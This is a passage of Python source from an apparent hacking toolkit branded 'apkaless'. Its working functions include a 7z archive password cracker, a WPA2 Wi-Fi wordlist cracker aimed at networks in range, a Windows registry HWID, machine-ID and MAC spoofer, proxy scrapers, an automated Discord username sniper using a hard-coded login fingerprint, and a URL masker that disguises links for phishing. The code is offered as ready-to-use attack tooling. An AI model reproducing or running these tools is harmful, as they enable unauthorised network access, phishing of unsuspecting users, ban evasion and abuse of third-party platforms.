            print(f'{red}[-] 7z file not found: {sevenzfile}')
            return
        
        if not os.path.exists(passlist):
            print(f'{red}[-] Password list not found: {passlist}')
            return
        
        # Check file extension
        if not sevenzfile.lower().endswith('.7z'):
            print(f'{red}[-] The file is not a 7z archive: {sevenzfile}')
            print(f'{yellow}[!] Please provide a file with .7z extension')
            time.sleep(3)
            return
        
        print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
        print(f'{cyan}║                           ENHANCED 7Z FILE CRACKER                          ║')
        print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
        
        print(f'{green}[+] 7z file:{white} {sevenzfile}')
        print(f'{green}[+] Password list:{white} {passlist}')
        print(f'{green}[+] Starting crack process...{rescolor}\n')
        
        # Count total passwords for progress tracking
        try:
            with open(passlist, 'r', encoding='utf-8', errors='ignore') as f:
                total_passwords = sum(1 for _ in f)
        except:
            total_passwords = 0
        
        if total_passwords > 0:
            print(f'{green}[+] Total passwords to test:{white} {total_passwords:,}')
        
        start_time = time.time()
        passwords_tested = 0
        password_found = False
        
        # Test passwords
        with open(passlist, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, password in enumerate(f, 1):
                password = password.strip()
                if not password:
                    continue
                
                try:
                    passwords_tested += 1
                    
                    # Progress update every 100 passwords
                    if passwords_tested % 100 == 0:
                        elapsed = time.time() - start_time
                        rate = passwords_tested / elapsed if elapsed > 0 else 0
                        progress = (passwords_tested / total_passwords * 100) if total_passwords > 0 else 0
                        print(f'\r{cyan}[!] Testing password {passwords_tested:,}/{total_passwords:,} '
                              f'({progress:.1f}%) - Rate: {rate:.0f} pwd/s - Current: {password[:20]}...', end='')
                    
                    # Try to extract with current password
                    try:
                        patoolib.extract_archive(file=sevenzfile, password=password)
                        
                        # If we get here, password was correct
                        elapsed = time.time() - start_time
                        print(f'\n{green}[+] PASSWORD FOUND!{rescolor}')
                        print(f'{green}[+] Password:{white} {password}')
                        print(f'{green}[+] Time taken:{white} {elapsed:.2f} seconds')
                        print(f'{green}[+] Passwords tested:{white} {passwords_tested:,}')
                        
                        password_found = True
                        
                        # Save results
                        try:
                            os.chdir(tool_parent_dir)
                            try:
                                os.makedirs('7z_Cracker', exist_ok=True)
                            except:
                                pass
                            
                            os.chdir('7z_Cracker')
                            
                            with open('7z_cracker_results.txt', 'a', encoding='utf-8') as result_file:
                                result_file.write(f'7z File: {sevenzfile}\n')
                                result_file.write(f'Password: {password}\n')
                                result_file.write(f'Time Taken: {elapsed:.2f} seconds\n')
                                result_file.write(f'Passwords Tested: {passwords_tested:,}\n')
                                result_file.write('='*50 + '\n\n')
                            
                            print(f'\n{green}[+] Results saved to:{white} {os.path.abspath("7z_cracker_results.txt")}')
                            
                        except Exception as e:
                            logger.warning(f"Could not save results: {e}")
                            print(f'{yellow}[!] Could not save results to file{rescolor}')
                        
                        break
                        
                    except Exception as e:
                        # Password was incorrect, continue to next
                        continue
                
                except Exception as e:
                    logger.warning(f"Error testing password '{password}': {e}")
                    continue
        
        # If we get here, password wasn't found
        if not password_found:
            elapsed = time.time() - start_time
            print(f'\n{red}[-] Password not found in the list{rescolor}')
            print(f'{yellow}[!] Total passwords tested: {passwords_tested:,}')
            print(f'{yellow}[!] Time elapsed: {elapsed:.2f} seconds')
            
            # Save failed attempt results
            try:
                os.chdir(tool_parent_dir)
                try:
                    os.makedirs('7z_Cracker', exist_ok=True)
                except:
                    pass
                
                os.chdir('7z_Cracker')
                
                with open('7z_cracker_failed.txt', 'a', encoding='utf-8') as result_file:
                    result_file.write(f'7z File: {sevenzfile}\n')
                    result_file.write(f'Status: Password not found\n')
                    result_file.write(f'Time Taken: {elapsed:.2f} seconds\n')
                    result_file.write(f'Passwords Tested: {passwords_tested:,}\n')
                    result_file.write('='*50 + '\n\n')
                
                print(f'{yellow}[!] Failed attempt logged to:{white} {os.path.abspath("7z_cracker_failed.txt")}')
                
            except Exception as e:
                logger.warning(f"Could not save failed attempt: {e}")
        
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        
    except FileNotFoundError:
        print(f'{red}[-] One or more input files not found')
    except Exception as e:
        logger.error(f"7z cracker error: {e}")
        print(f'{red}[-] An unexpected error occurred: {e}')
    
    finally:
        # Return to original directory
        try:
            os.chdir(tool_parent_dir)
        except:
            pass


def get_hwid():
    mac_address = []
    for interface, address in psutil.net_if_addrs().items():
        for addr in address:
            if addr.family == psutil.AF_LINK:
                mac_address.append(addr.address)
    else:
        hostname = socket.gethostname()
        unhashed_hwid = f'{hostname}' + ''.join(mac_address)
        hashed_hwid = hashlib.md5(unhashed_hwid.encode('ascii')).hexdigest()
        return hashed_hwid


def crack_wifi(dictionary):
    os.system('cls')
    with open(dictionary, 'r') as f:
        try:
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
        except:
            print(f'{red}\n[-] No WIFI Interface Ensured.')
            time.sleep(3)
            enhanced_main()

        iface.scan()
        for i in range(5):
            print(f'\r{green}[+] Scanning All Wifi In Range, Waiting {white}({str(4 - i)})', end='')
            time.sleep(1)
        print('\n')
        os.system('cls')
        bssids = iface.scan_results()
        wifi_names_signals = []
        for bssid in bssids:
            wifi_names = (bssid.signal + 100, bssid.ssid)
            wifi_names_signals.append(wifi_names)
        wifi_names_signals = sorted(wifi_names_signals, reverse=True)
        id = 0
        print('-' * 30)
        while id < len(wifi_names_signals):
            print('{:<8d}{:<8d}{}'.format(id, wifi_names_signals[id][0], wifi_names_signals[id][1]))
            id += 1
        print('-' * 30)

        while True:
            wifi_id = int(input(f'\n{yellow}[!] Please Select Wifi ID You Wanna Crack:{white} '))
            wifi_to_crack = wifi_names_signals[wifi_id][1]
            confirmation = input(
                f'\n{yellow}[!] Is This The Wifi Name {white}{wifi_to_crack} {yellow}You Wanna Crack {white}(Y/N): ')
            confirmation = confirmation.lower()
            if confirmation == 'y' or confirmation == 'yes':
                break
            else:
                continue
        os.system('cls')
        iface.disconnect()
        while iface.status() == 4:
            pass

        print(f'\r{green}[+] Wi-Fi Interface Disconnected', end='')

        for pwd in f:

            pwd = pwd.strip('\n')
            profile = pywifi.Profile()
            profile.ssid = wifi_to_crack
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1:
                os.system('cls')
                if iface.status() == 4:
                    print(
                        f'\r{green}[+] Connected To {white}{wifi_to_crack} {green}With Password: [{white}{pwd}{green}] {yellow}    ',end='  ')
                    input(
                        f'{yellow}\n[!] Hit Enter To Save The Password Into {white}{wifi_to_crack}.txt {yellow}and Back To Main Menu')
                    with open(f'{wifi_to_crack}.txt', 'a') as filedata:
                        filedata.writelines(['-' * 38, f'\nWi-Fi: {wifi_to_crack}\nPassword: {pwd}\n', '-' * 38])
                        filedata.close()
                    enhanced_main()
                else:
                    print(f'{yellow}[!] Trying To Connect To {white}{wifi_to_crack} {yellow}With Password: {white}{pwd}')


def restart_adapter(adapters):
    for adapter in adapters:
        try:

            subprocess.check_output(f'netsh interface set interface {adapter} admin=disable', shell=True,
                                    text=True, stderr=subprocess.PIPE)
            subprocess.check_output(f'netsh interface set interface {adapter} admin=enable', shell=True,
                                    text=True, stderr=subprocess.PIPE)
            time.sleep(5)
        except Exception as e:
            print(e)
            input('')
    return None


def machineID_spoofer():
    os.system('cls')

    dev_ids = ['DEV_0008', 'DEV_27ba', 'DEV_27bb', 'DEV_27fa', 'DEV_008', 'DEV_009', 'DEV_0018', 'DEV_0019', 'DEV_0020',
               'DEV_0028', 'DEV_0029', 'DEV_002a', 'DEV_002b', 'DEV_002c', 'DEV_002d', 'DEV_10de002e', 'DEV_1545002f']

    def spoof_display_id():

        new_display_id = ''.join(random.choice(string.ascii_uppercase) for _ in range(3)) + ''.join(
            random.choice(string.digits) for _ in range(4))
        new_display_id = fr'MONITOR\{new_display_id}'
        reg_key = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\DISPLAY'
        display = subprocess.check_output(f'reg query {reg_key}', text=True, stderr=subprocess.PIPE)
        display_list = display.strip().split('\n')
        for display in display_list:
            query = subprocess.check_output(f'reg query {display}', text=True, stderr=subprocess.PIPE)
            classInstances = query.strip().split('\n')
            for classInstance in classInstances:
                query = subprocess.check_output(
                    f'reg add {classInstance} /v HardwareID /t REG_MULTI_SZ /d {new_display_id} /f',
                    text=True, stderr=subprocess.PIPE)
                if 'The operation completed successfully.' in query:
                    print(f'\n{green}[+] Display ID Spoofed Successfully !')
                else:
                    print(f'\n{red}[-] Display ID Spoofed Failed !')

    def spoof_gpu():

        base_key = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\PCI'
        pnp_did = subprocess.check_output('wmic path Win32_VideoController get PNPDeviceID', shell=True,text=True, stderr=subprocess.PIPE)
        pnp_did = pnp_did.strip().split('PCI')[1]
        full_key = base_key + pnp_did
        query = subprocess.check_output(f'reg query {full_key}', shell=True, text=True, stderr=subprocess.PIPE)
        q = query.strip().split('\n')
        print(q)
        # for _ in q:
        #     if 'HardwareID' in _:
        #         data = _.strip().split()
        #         hardware_ids = data[-1]
        #         new_hardware_id = hardware_ids.split('\\')
        #         did = new_hardware_id[1].split('&')
        #         for _ in did:
        #             if 'DEV' in _:
        #                 current_did = _.strip()
        #                 new_hardware_id = hardware_ids.replace(current_did, random.choice(dev_ids))
        #                 try:
        #                     spoof = subprocess.check_output(f'reg add {full_key} /v HardwareID /t REG_MULTI_SZ /d {new_hardware_id} /f',
        #                                                     text=True, stderr=subprocess.PIPE)

        #                     if 'The operation completed successfully.' in spoof:
        #                         print(f'\n{green}[+] GPU Spoofed Successfully !')
        #                 except:
        #                     print("Couldn't Spoof GPU !,  Try Again !")


    def generate_machine_id(lenghts):
        letters = string.ascii_letters + string.digits
        machine_id = '-'.join(''.join(random.choice(letters) for _ in range(length)) for length in lenghts)
        machine_id = '{%s}' % machine_id
        return machine_id

    def set_registry_keys(registry_keys):
        statue = None
        for key, value in registry_keys.items():
            try:
                res = subprocess.check_output(
                    f'reg add {key} /v {value["name"]} /t REG_SZ /d {value["value"]} /f',
                    shell=True, text=True, stderr=subprocess.PIPE)
                if 'The operation completed successfully.' in res:
                    print(f'\n{green}[+] {value["name"]} Spoofed Successfully !')
                    statue = True
                else:
                    statue = False
            except Exception as e:
                if 'ProductId' in str(e):
                    print(f'\n{red}[!] Couldn\'t Spoof ProductId !')
                    statue = True
                elif 'HwProfileGuid' in str(e):
                    print(f'\n{red}[!] Couldn\'t Spoof HwProfileGuid !')
                    statue = True

                else:
                    statue = False

        return statue

    registry_keys = {
        r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient': {"name": "MachineId",
                                                             "value": generate_machine_id([8, 4, 4, 4, 12]).lower()},
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography": {"name": "MachineGuid",
                                                                "value": generate_machine_id([8, 4, 4, 4, 12]).lower()},
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion": {"name": "ProductId",
                                                                             "value": generate_machine_id(
                                                                                 [5, 5, 5, 5])},
        r'"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"': {
            "name": "HwProfileGuid",
            "value": generate_machine_id([8, 4, 4, 4, 12]).lower()}
    }

    if set_registry_keys(registry_keys):
        spoof_display_id()
        spoof_gpu()
        os.chdir(path_to_assistfolder)
        os.chdir('tools')
        os.chdir('hwids')
        mainfile = os.listdir()[0]
        subprocess.check_output(f'start {mainfile}', shell=True)
        return True

    else:
        return False


def hwid_spoofer():
    connected_interfaces = []
    current_mac_address = {}
    connected_adapters = []
    transports = []
    active_interfaces = []
    letters = 'abcdefghijklmn1234567890'
    new_mac_address = 'DE' + ''.join(random.choice(letters) for _ in range(10))
    new_mac_address = new_mac_address.upper()

    # Grab The Connected Interfaces on this os
    for interface in psutil.net_if_addrs():
        if interface == 'Ethernet0' or interface == 'Ethernet' or interface == 'Wi-Fi':
            address = psutil.net_if_addrs()[interface]
            for addr in address:
                if addr.family == psutil.AF_LINK:  # store mac address of each connected interface
                    current_mac_address[interface] = addr.address

            connected_interfaces.append(interface)

    for conn in connected_interfaces:
        mac_address = current_mac_address[conn]

    result = subprocess.check_output(['getmac'], text=True, stderr=subprocess.PIPE).strip().splitlines()[2:]

    for mac_adress in current_mac_address:
        mac_addr = current_mac_address[mac_adress]
        for adapter in result:
            if mac_addr in adapter:
                connected_adapters.append(adapter.strip())

    for trans in connected_adapters:
        transport = trans.split('_')[1]
        transports.append(transport)

    success = False
    n = 0
    iterate = True

    while iterate:
        try:
            if n >= 10:
                interface = r'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\00' + str(n)
            else:
                interface = r'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\000' + str(n)
            query = subprocess.check_output(f'reg query {interface}', text=True, stderr=subprocess.PIPE)
            for trans in transports:
                if trans in query:
                    transports.remove(trans)
                    active_interfaces.append(interface)
            n += 1
        except:
            break

    for active_interface in active_interfaces:
        spoof = subprocess.check_output(f'reg add {active_interface} /v NetworkAddress /d {new_mac_address} /f',
                                        text=True, stderr=subprocess.PIPE)
        if 'The operation completed successfully.' in spoof:
            restart_adapter(connected_interfaces)
            success = True
        else:
            success = False
    return success


def proxy_gen():
    global a, b, new
    from threading import Thread
    os.system('cls')
    os.chdir(tool_parent_dir)
    threads = []
    p1 = Thread(target=SCRAPER().proxy_1)
    p2 = Thread(target=SCRAPER().proxy_2)
    p3 = Thread(target=SCRAPER().proxyScraper)
    p4 = Thread(target=SCRAPER().proxyScraper_2)
    p1.start()
    threads.append(p1)
    time.sleep(1)
    p2.start()
    threads.append(p2)
    time.sleep(1)
    p3.start()
    threads.append(p3)
    time.sleep(3)
    p4.start()
    threads.append(p4)
    time.sleep(4)

    for thread in threads:  # this simply tells python interpreter wait to finish all the threads then continue Execute
        # The Code
        thread.join()
    try:
        proxies = SCRAPER().proxies
        b = len(proxies)
        new = [prx for prx in dict.fromkeys(proxies)]
        a = len(new)
    except:
        pass

    for proxy in new:
        with open('scraped_proxies.txt', 'a') as file:
            file.writelines([proxy, '\n'])
            file.close()
    print(
        f'\n{green}[+] Total Proxies: {white}{b}\n{green}[+]{red} {b - a} Duplicated Proxies {green}Has Been Removed.\n{green}[+] Saved Into: {white}Scraped_proxies.txt')


def proxy_check(prx_list):
    os.system('cls')
    os.chdir(tool_parent_dir)

    def save_working(proxy, type):

        with open(f'{type}.txt', 'a') as f:
            f.writelines([proxy, '\n'])
            f.close()

    def check(proxy):

        http_prx = HttpProxyChecker(proxy, 10).start_checker()
        socks4_prx = Socks4ProxyChecker(proxy, 10).start_checker()
        socks5_prx = Socks5ProxyChecker(proxy, 10).start_checker()

        if http_prx:
            http_proxies.append(proxy)
            save_working(proxy, 'http')
        elif socks4_prx:
            socks4_proxies.append(proxy)
            save_working(proxy, 'socks4')
        elif socks5_prx:
            socks5_proxies.append(proxy)
            save_working(proxy, 'socks5')
        else:
            errors.append(proxy)

    with open(prx_list, 'r') as f:

        proxies = []
        threds = []
        http_proxies = []
        socks4_proxies = []
        socks5_proxies = []
        errors = []

        for prx in f:
            prx = prx.strip('\n')
            proxies.append(prx)

        for proxy in proxies:
            th = Thread(target=check, args=(proxy,))
            th.start()
            threds.append(th)

            print(
                f'\r{green}Http({len(http_proxies)}) :: {cyan}Socks4({len(socks4_proxies)}) :: {lmagenta}Socks5({len(socks5_proxies)}) :: {red}Errors({len(errors)})',
                end='   ')
            

def discordHunter(email, password):
    def internetChecker():
        print('\n[!] Checking Your Connection To The Internet ...\n')
        try:
            cloudscraper.create_scraper().get('https://www.google.com/')
            return 1
        except:
            return 0

    def randomUser():
        letters = string.ascii_letters + string.digits
        username2 = ''.join(random.choice(letters) for _ in range(3)) + ''.join('_')
        username3 = ''.join(random.choice(letters) for _ in range(3)) + ''.join('.')
        username5 = ''.join('_') + ''.join(random.choice(letters) for _ in range(3))
        username6 = ''.join('.') + ''.join(random.choice(letters) for _ in range(3))
        username8 = ''.join(random.choice(letters) for _ in range(2)) + ''.join('_') + ''.join(
            random.choice(letters) for _ in range(1))
        username9 = ''.join(random.choice(letters) for _ in range(2)) + ''.join('.') + ''.join(
            random.choice(letters) for _ in range(1))
        username11 = ''.join(random.choice(letters) for _ in range(1)) + ''.join('_') + ''.join(
            random.choice(letters) for _ in range(2))
        username12 = ''.join(random.choice(letters) for _ in range(1)) + ''.join('.') + ''.join(
            random.choice(letters) for _ in range(2))
        users = [username2, username3, username5, username6, username8, username9, username11, username12]
        return users

    def dominator(email, password):
        os.system('cls')
        with cloudscraper.create_scraper(debug=False) as s:
            login_url = 'https://discord.com/api/v9/auth/login'
            headers = {
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                'X-Fingerprint': '1217540505496453165.T6xcPKVjXPtiJR3NoT8BoojkmJY',
                'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI3NDM4OCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
            }
            data = {
                'captcha_key': 'null',
                'login': f"{email}",
                'login_source': 'null',
                'password': f"{password}",
                'undelete': 'false'
            }
            res = s.post(login_url, headers=headers, json=data, timeout=10000)
            try:
                saved_cookies = res.cookies
                token = res.json()['token']
            except:
                print(f'\n{red}[-] Invalid Account Information\n')
                time.sleep(3)
                exit(0)
            print(f'{green}[+] Login Success !\n')
            time.sleep(2)
            os.system('cls')
            counter = 0
            falseUsers = []
            capturedUsers = []
            globalFalse = []
            checkedUsers = []
            ranText = ['You Are A Good Hunter Keep It Up', 'Fire You r BraiN You Bit*h',
                       'Follow Me On Instagram ==> Apkaless',
                       'FBI AND CIA ARE COMING TO UR LOCATION MOVE AWAY RIGHT NOW',
                       'You Got Detected By Discord Security System!!!!!',
                       'I Love When Y O u Use UR Mind',
                       'This is a message from apkaless 2 u son of a good man: dont be bad guy.',
                       'Im From Iraq', 'My Real Name is "S****" Try To Guess My Name :)']
            while True:
                usersList = randomUser()
                try:
                    for username in usersList:

                        if len(globalFalse) > 0:
                            username = globalFalse.pop(0)

                            globalFalse.clear()

                        print(fr'''{cyan}
                ___          __         __              
               /   |  ____  / /______ _/ /__  __________
              / /| | / __ \/ //_/ __ `/ / _ \/ ___/ ___/
             / ___ |/ /_/ / ,< / /_/ / /  __(__  |__  ) 
            /_/  |_/ .___/_/|_|\__,_/_/\___/____/____/  
                  /_/ 

            {yellow}[!] Checking User      : [{white}{username}{yellow}]
            {green}[+] Captured Users     : [{white}{len(capturedUsers)}{green}]
            {red}[-] Unavailable Users  : [{white}{len(falseUsers)}{red}]
            {cyan}[!] Total Checked Users: [{white}{len(checkedUsers)}{cyan}]
            {yellow}[::] {green}{random.choice(ranText)}

                        ''')
                        counter += 1

                        data2 = {
                            'password': f"{password}",
                            'username': f"{username}"
                        }

                        headers2 = {
                            'Accept': '*/*',
                            'Authorization': f'{token}',
                            'Content-Type': 'application/json',
                            'Origin': 'https://discord.com',
                            'Referer': 'https://discord.com/login',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                            'X-Fingerprint': '&',
                            'X-Super-Properties': '&'
                        }

                        user = s.patch('https://discord.com/api/v9/users/@me', headers=headers2, json=data2,
                                       cookies=saved_cookies)
                        if 'code' in user.json():
                            falseUsers.append(username)
                            checkedUsers.append(username)
                            # print(f'\n{counter}) [-] Username Unavailable ===> {username}\n========================\n')
                        elif 'captcha_key' in user.json():
                            # print(f'{counter}) Captured User ===> {username}\n======================')
                            with open('captured.txt', 'a') as f:
                                f.writelines([
                                    f'====================\nCaptured By Apkaless\n====================\nUser: {username}\n====================\nFollow Me On Instagram ===> Apkaless\n====================\n',
                                    '\n'])
                                f.close()
                                capturedUsers.append(username)
                                checkedUsers.append(username)
                        elif 'global' in user.json():
                            # print(f'\n{counter}) Flagged User ===> {username}\n====================\n')
                            globalFalse.append(username)
                            time.sleep(2)
                        os.system('cls')
                except IndexError:
                    continue

    if internetChecker():
        dominator(email, password)
    else:
        print(f'{yellow}[!] You Need To Connect To The Internet In Order To Use This Tool')
        time.sleep(3)

def url_masking():
    init(convert=True)
    version = '1'
    github_url = 'https://github.com/apkaless'
    instagram = 'https://instagram.com/apkaless'
    region = 'IRAQ'
    red = Fore.RED
    green = Fore.GREEN
    yellow = Fore.YELLOW
    white = Fore.WHITE
    cyan = Fore.CYAN
    lw = Fore.LIGHTWHITE_EX
    black = Fore.BLACK
    lr = Fore.LIGHTRED_EX
    lb = Fore.LIGHTBLUE_EX
    lc = Fore.LIGHTCYAN_EX
    lib = Fore.LIGHTBLACK_EX
    res = Fore.RESET



    def validate_url(url):
        url_format = re.compile(r'https?://(www.)?[a-zA-Z0-9-]+\.+[a-zA-Z0-9]+')

        if not re.match(url_format, url):
            raise ValueError('\nInvalid URL format. Please provide a valid web URL.\n')


    def validate_custom_domain(custom_domain):
        domain_format = re.compile(r'[a-zA-Z0-9-]+\.+[a-zA-Z0-9]+')

        if not re.match(domain_format, custom_domain):
            raise ValueError('\nInvalid custom domain. Please provide a valid domain name.\n')


    def validate_keyword(keyword):
        length = 30

        if not isinstance(keyword, str):

            raise TypeError('\nInput must be a string.\n')

        elif ' ' in keyword:
            raise TypeError('\nKeyword Must Not Contain Spaces, Replace Spaces With "-".\n')

        elif len(keyword) > length:
            raise ValueError('\nInput string exceeds the maximum allowed length.\n')

        return True

    def extract_url(html_content: str):

        soup = BeautifulSoup(html_content, 'lxml')

        div = soup.find('div', attrs={'id': 'app'})
        
        return div.a.text

    def short_url(web_url):

        data = {
            'url':f'{web_url}',
            'shorturl':''
        }

        headers = {

            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'

        }

        res = requests.post('https://da.gd/', data=data, headers=headers)
        shorted_url = extract_url(res.text)

        return shorted_url

    def mask_url(custom_domain, keyword, url):
        parsd_url = urlparse(short_url(url))

        masked_url = f'{parsd_url.scheme}://{custom_domain}-{keyword}@{parsd_url.netloc}{parsd_url.path}'

        return masked_url

    def short_url_(url):
            data = {
                'u': url
            }
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
                }
            url = 'https://www.shorturl.at/shortener.php'
            res = requests.post(url, data=data, headers=headers, allow_redirects=False)

            if res.status_code == 200:
                html = res.text
                soup = BeautifulSoup(html, "lxml")
                inputs = soup.find_all('input')
                for element in inputs:
                    if element.attrs['id'] == 'shortenurl':
                        return element['value']
            else:
                print(f'\n{red}[+] Try Again After 5 Minutes\n')
                input('\n')
                sys.exit(1)

    def print_banner():
        os.system('cls')
        print(rf'''{cyan}

    █████╗ ██████╗ ██╗  ██╗ █████╗ ██╗     ███████╗███████╗███████╗
    ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██║     ██╔════╝██╔════╝██╔════╝
    ███████║██████╔╝█████╔╝ ███████║██║     █████╗  ███████╗███████╗
    ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║     ██╔══╝  ╚════██║╚════██║
    ██║  ██║██║     ██║  ██╗██║  ██║███████╗███████╗███████║███████║
    ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝
                                                                    

    {green}Version     : {lc}{version}
    {green}Github      : {lc}{github_url}
    {green}Instagram   : {lc}{instagram}
    {green}Region      : {lc}{region}        

    ''')

    while True:
            print_banner()
            try:
                url_type = int(input(f"""{cyan}[~] Please Determine The URL Type:\n\n\n\t\t{white}[1] Normal URL {cyan}(ex: https://example.com/)\n\n\t\t{white}[2] Host:Port URL {cyan}(ex: https://example.com:8080)\n\n↳ Select →{white}  """))
                if url_type == 1:
                    url = input(f'{cyan}\n↳ URL To Mask {cyan}→{white}  ')
                    validate_url(url)
                    break
                elif url_type == 2:
                    url = input(f'{cyan}\n↳ URL To Mask {cyan}→{white}  ')
                    validate_url(url)
                    url = short_url_(url)
                    break
                else:
                    print(f'{red}\nPlease Select Option From Above.')
            except Exception as e:
                sleep(1)
                continue
    while True:
        try:
            custom_domain = input(f'{cyan}\n↳ Custom Domain {green}(ex: google.com) {cyan}→{white}  ')
            validate_custom_domain(custom_domain)
            break
        except Exception as e:
            print(red + str(e))
            sleep(2)
            continue

    while True:

        try:

            keyword = input(f'{cyan}\n↳ Phish Keyword {green}(ex: login, free, anything) {cyan}→{white} ')
            validate_keyword(keyword)
            break
        except Exception as e:
            print(red + str(e))
            sleep(2)
            continue

    masked_url = mask_url(custom_domain, keyword, url)
    print(f'\n{green}[~] Original URL →{cyan} {url}')
    print(f'\n{green}[~] Masked URL →{cyan} {masked_url}')
    input('\n\n')

def remove_tools():
    os.chdir(path_to_assistfolder)
    shutil.rmtree('tools')

def enhanced_py2exe(fpath, icpath):
    """Enhanced Python to EXE converter with better error handling and user experience"""
    os.system('cls')
    os.chdir(tool_parent_dir)
    
    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
    print(f'{cyan}║                        PYTHON TO EXE CONVERTER                               ║')
    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
    
    try:
        # Validate input files
        if not os.path.exists(fpath):
            print(f'{red}[-] Python file not found: {fpath}{rescolor}')
            return False
        
        if icpath and not os.path.exists(icpath):
            print(f'{yellow}[!] Icon file not found: {icpath}{rescolor}')
            print(f'{cyan}[!] Continuing without custom icon...{rescolor}')
            icpath = None
        
        print(f'{green}[+] Python file:{white} {fpath}')
        if icpath:
            print(f'{green}[+] Icon file:{white} {icpath}')
        else:
            print(f'{green}[+] Icon file:{white} Using default icon{rescolor}')
        
        # Check Python installation
        print(f'\n{cyan}[!] Checking Python installation...{rescolor}')
        try:
            python_version = subprocess.check_output('python --version', shell=True, 
                                                  stderr=subprocess.STDOUT, text=True, timeout=10)
            print(f'{green}[+] Python found:{white} {python_version.strip()}{rescolor}')
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            print(f'{red}[-] Python not found or not accessible{rescolor}')
            print(f'{yellow}[!] Attempting to install Python...{rescolor}')
            
            try:
                # Download Python installer
                print(f'{cyan}[!] Downloading Python 3.11.8...{rescolor}')
                subprocess.check_output(
                    'curl -s -L "https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe" --output python_installer.exe',
                    shell=True, timeout=60)
                
                print(f'{green}[+] Python installer downloaded successfully{rescolor}')
                print(f'{yellow}[!] Installing Python (this may take a few minutes)...{rescolor}')
                
                # Install Python silently
                subprocess.check_output('python_installer.exe /quiet InstallAllUsers=1 PrependPath=1', 
                                      shell=True, timeout=300)
                
                print(f'{green}[+] Python installed successfully{rescolor}')
                
                # Clean up installer
                if os.path.exists('python_installer.exe'):
                    os.remove('python_installer.exe')
                    
            except Exception as e:
                print(f'{red}[-] Failed to install Python: {e}{rescolor}')
                print(f'{yellow}[!] Please install Python manually and try again{rescolor}')
                return False
        
        # Check/Install PyInstaller
        print(f'\n{cyan}[!] Checking PyInstaller installation...{rescolor}')
        try:
            pyinstaller_version = subprocess.check_output('pyinstaller --version', shell=True, 
                                                        stderr=subprocess.STDOUT, text=True, timeout=10)
            print(f'{green}[+] PyInstaller found:{white} {pyinstaller_version.strip()}{rescolor}')
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            print(f'{yellow}[!] PyInstaller not found. Installing...{rescolor}')
            try:
                subprocess.check_output('pip install pyinstaller', shell=True, timeout=120)
                print(f'{green}[+] PyInstaller installed successfully{rescolor}')
            except Exception as e:
                print(f'{red}[-] Failed to install PyInstaller: {e}{rescolor}')
                return False
        
        # Check/Install additional dependencies
        print(f'\n{cyan}[!] Checking additional dependencies...{rescolor}')
        dependencies = ['pillow', 'pefile']
